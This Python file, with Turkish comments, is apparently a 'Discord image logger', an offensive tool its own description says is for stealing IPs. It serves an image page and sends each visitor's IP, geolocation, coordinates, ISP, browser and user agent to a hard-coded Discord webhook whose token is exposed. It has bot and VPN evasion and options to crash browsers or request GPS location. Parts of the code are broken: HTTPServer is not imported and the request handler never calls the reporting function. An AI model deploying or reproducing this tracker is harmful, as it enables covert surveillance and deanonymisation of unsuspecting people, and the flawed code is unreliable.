# Discord Görsel Kayıt Aracı
# DeKrypt tarafından | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Görsel Kayıt Aracı"
__description__ = "Discord'un Orijinal Görsel Açma özelliğini kötüye kullanarak IP'leri çalmanıza ve daha fazlasına olanak tanır"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # TEMEL AYARLAR #
    "webhook": "https://discord.com/api/webhooks/1345388594168070226/v-u1cmc231qXInvUU2bS3SGA-xIDr3eXZ0rfrPz7bG5obyYPNsbHapUWHDAiul60fOKV",
    "image": "https://img-logger-ixw6.vercel.app/api/main.py", # Özel bir görsel kullanabilirsiniz, URL parametresi ile
                  # (Örnek: siteniz.com/gorselkayit?url=<URL-encoded görsel bağlantısı buraya>)
    "imageArgument": True, # Görseli değiştirmek için URL parametresi kullanılmasına izin verir (README'ye bakınız)

    # ÖZELLEŞTİRME #
    "username": "Görsel Kayıt Aracı", # Webhook'a vermek istediğiniz kullanıcı adı
    "color": 0x00FFFF, # Embed için istediğiniz renk (Örnek: Kırmızı 0xFF0000)

    # SEÇENEKLER #
    "crashBrowser": False, # Kullanıcının tarayıcısını çökertmeye çalışır, çalışmayabilir. (BUNU YAPTIM, BAKIN https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Kullanıcıların tam konumlarını GPS ile bulur (Gerçek adres vb.) kullanıcıdan izin ister, şüpheli olabilir.

    "message": { # Görseli açan kullanıcıya özel bir mesaj göster
        "doMessage": False, # Özel mesajı etkinleştir?
        "message": "Bu tarayıcı DeKrypt'in Görsel Kayıt Aracı tarafından hacklendi. https://github.com/dekrypted/Discord-Image-Logger", # Gösterilecek mesaj
        "richMessage": True, # Zengin metin mesajını etkinleştir? (Daha fazla bilgi için README'ye bakınız)
    },

    "vpnCheck": 1, # VPN'lerin uyarıyı tetiklemesini engeller
                   # 0 = Anti-VPN yok
                   # 1 = VPN şüphelenildiğinde uyarı gönderme
                   # 2 = VPN şüphelenildiğinde uyarı gönderme

    "linkAlerts": True, # Bağlantı gönderildiğinde uyarı gönder (Bağlantı birkaç kez kısa süre içinde gönderilmişse çalışmayabilir)
    "buggedImage": True, # Discord'a gönderildiğinde önizlemede yükleniyor görseli gösterir (Bazı cihazlarda sadece rastgele renkli bir görsel olarak görünebilir)

    "antiBot": 1, # Botların uyarıyı tetiklemesini engeller
                   # 0 = Anti-Bot yok
                   # 1 = Muhtemelen bir bot olduğunda uyarı göndermemek
                   # 2 = %100 bot olduğunda uyarı göndermemek
                   # 3 = Muhtemelen bot olduğunda uyarı göndermemek
                   # 4 = %100 bot olduğunda uyarı göndermemek
                   # 5 = Botlar için herhangi bir işlem yapılmaz
    
    # YÖNLENDİRME #
    "redirect": {
        "redirect": False, # Bir web sayfasına yönlendirme yapmak?
        "page": "https://your-link.here" # Yönlendirilecek web sayfasının bağlantısı 
    },

    # Lütfen tüm değerleri doğru formatta girin. Aksi takdirde hata oluşabilir.
    # Aşağıdaki kısmı değiştirmeyin, ancak ne yaptığınızı biliyorsanız değiştirebilirsiniz.
    # NOT: Hiyerarşi ağacı şu şekilde işlemektedir:
    # 1) Yönlendirme (Bu etkinse, görsel ve tarayıcıyı çökertme devre dışı bırakılır)
    # 2) Tarayıcıyı Çökertme (Bu etkinse, görsel devre dışı bırakılır)
    # 3) Mesaj (Bu etkinse, görsel devre dışı bırakılır)
    # 4) Görsel 
}

blacklistedIPs = ("27", "104", "143", "164") # Kara listeye alınan IP'ler. Bir IP'nin tamamını veya başlangıcını girerek bir blok IP'yi engelleyebilirsiniz.
                                                # Bu özellik, botları daha iyi tespit etmek için kullanılmaktadır.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Görsel Kayıt Aracı - Hata",
            "color": config["color"],
            "description": f"IP kaydı yaparken bir hata oluştu!\n\n**Hata:**\n\n{error}\n",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Görsel Kayıt Aracı - Bağlantı Gönderildi",
            "color": config["color"],
            "description": f"Bir **Görsel Kayıt** bağlantısı bir sohbette gönderildi!\nYakında bir IP alabilirsiniz.\n\n**Endpoint:** {endpoint}\n**IP:** {ip}\n**Platform:** {bot}",
        }
    ],
}) if config["linkAlerts"] else None # Uyarı göndermek, kullanıcı link uyarılarını devre dışı bırakmadıysa
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Görsel Kayıt Aracı - IP Kaydedildi",
            "color": config["color"],
            "description": f"""**Bir Kullanıcı Orijinal Görseli Açtı!**

**Endpoint:** {endpoint}
            
**IP Bilgileri:**
> **IP:** {ip if ip else 'Bilinmiyor'}
> **Sağlayıcı:** {info['isp'] if info['isp'] else 'Bilinmiyor'}
> **ASN:** {info['as'] if info['as'] else 'Bilinmiyor'}
> **Ülke:** {info['country'] if info['country'] else 'Bilinmiyor'}
> **Bölge:** {info['regionName'] if info['regionName'] else 'Bilinmiyor'}
> **Şehir:** {info['city'] if info['city'] else 'Bilinmiyor'}
> **Koordinatlar:** {str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')} ({'Yaklaşık' if not coords else 'Kesin, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Saat Dilimi:** {info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})
> **Mobil:** {info['mobile']}
> **VPN:** {info['proxy']}
> **Bot:** {info['hosting'] if info['hosting'] and not info['proxy'] else 'Muhtemel' if info['hosting'] else 'Hayır'}

**PC Bilgileri:**
> **İşletim Sistemi:** {os}
> **Tarayıcı:** {browser}

**Kullanıcı Ajansı:**
{useragent}
""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.client_address[0], self.headers.get('User-Agent')):
                return

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(data)
        except Exception as e:
            traceback.print_exc()
            reportError(e)

    def do_GET(self):
        self.handleRequest()

def run(server_class = HTTPServer, handler_class = ImageLoggerAPI):
    server_address = ('', 80)
    httpd = server_class(server_address, handler_class)
    print(f'{__app__} {__version__} çalışıyor...')
    httpd.serve_forever()

if __name__ == "__main__":
    run()
